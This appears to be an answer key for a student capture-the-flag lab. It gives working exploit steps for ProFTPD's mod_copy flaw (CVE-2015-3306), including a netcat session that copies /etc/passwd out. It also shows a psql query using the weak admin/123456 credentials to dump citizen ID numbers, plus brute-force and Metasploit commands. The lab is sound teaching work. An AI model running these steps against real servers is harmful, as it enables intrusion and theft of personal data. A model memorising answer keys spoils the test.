# SOLUTION / Answer Key — The Forgotten Server

> Spoilers. This is for the group that built the lab and for grading. It
> documents every intended weakness and one clean path to each flag.

## Overview of planted weaknesses

| # | Service        | Weakness                                              | Category                 |
|---|----------------|-------------------------------------------------------|--------------------------|
| 1 | FTP (ProFTPD 1.3.5) | **CVE-2015-3306** `mod_copy` — `SITE CPFR`/`SITE CPTO` arbitrary file read/write (RCE) | Outdated software / RCE |
| 2 | FTP (ProFTPD 1.3.5) | **Anonymous login enabled**                           | Authentication           |
| 3 | PostgreSQL     | **Weak admin credentials** `admin` / `123456`, port exposed | Credentials        |
| – | SSH (OpenSSH)  | Hardened decoy — no root login, key-only auth, locked account | (not vulnerable)  |

This satisfies the assignment: 3+ services, 2+ vulnerabilities, ≥1
authentication/credential/permission weakness, unauthorized access to data,
realistic content, and clear-text traffic that can be observed.

---

## Recon

```bash
nmap -sV -p- <TARGET_IP>
```

Expected: `21/tcp ftp ProFTPD 1.3.5`, `2222/tcp ssh OpenSSH`,
`5432/tcp postgresql`. The ProFTPD banner (`220 ... ProFTPD 1.3.5 ...`) is the
tell — 1.3.5 is vulnerable to CVE-2015-3306.

---

## Flag 1 — FTP file server → `FLAG{GeT_rEkT}`

### Easy path (anonymous)
```bash
ftp <TARGET_IP>
# Name: anonymous   (any/empty password)
ftp> ls
ftp> get flag.txt
ftp> get README_FILESHARE.txt
```
`flag.txt` → `FLAG{GeT_rEkT}`.

### Intended path — demonstrate the actual vulnerability (CVE-2015-3306)
`mod_copy` lets you copy files **outside** the published share without real
authentication. Example: read `/etc/passwd` by copying it into the share and
downloading it.

```bash
# Control channel (netcat). No login needed for SITE CPFR/CPTO on vulnerable builds.
nc <TARGET_IP> 21
SITE CPFR /etc/passwd
SITE CPTO /srv/ftp/passwd.txt
# then download /passwd.txt over FTP (anonymous) to prove arbitrary file read
```

Metasploit equivalent:
```
use exploit/unix/ftp/proftpd_modcopy_exec
```
(or `auxiliary` modules for the file-copy primitive). Copying an attacker-
controlled file into an executable/served location is what turns this into
full RCE in a real engagement — here, arbitrary read/write is enough to prove
the point.

---

## Flag 2 — CPR-Register → `FLAG{BaD_PaSS}`

The database uses `admin` / `123456` and the port is exposed.

```bash
# With psql
PGPASSWORD=123456 psql -h <TARGET_IP> -U admin -d postgres -c \
  "SELECT firstname, lastname, cpr FROM citizens;"
```

One citizen's `firstname` is `FLAG{BaD_PaSS}` (Mortensen, CPR 310893-3333).

No psql client? Use any Postgres GUI/driver, or:
```bash
nmap -p 5432 --script pgsql-brute <TARGET_IP>      # confirms weak creds
```

---

## Observing the attack in network traffic

```bash
sudo tcpdump -i any -w forgotten.pcap host <TARGET_IP>
```
Open in Wireshark:
- **FTP** (port 21) is clear text — the `USER anonymous`, `SITE CPFR/CPTO`
  commands and the copied file contents are all readable. Use "Follow TCP
  Stream".
- **PostgreSQL** (port 5432) startup/auth and the returned rows are visible in
  clear text as well.
- **SSH** (port 2222) is encrypted — you can see the connection and version
  exchange but not the payload. Good contrast for the write-up.

---

## Reset between groups

```bash
docker compose down -v && docker compose up -d --build
```
`-v` drops the Postgres volume so the seed data (and the flag) is recreated.
```
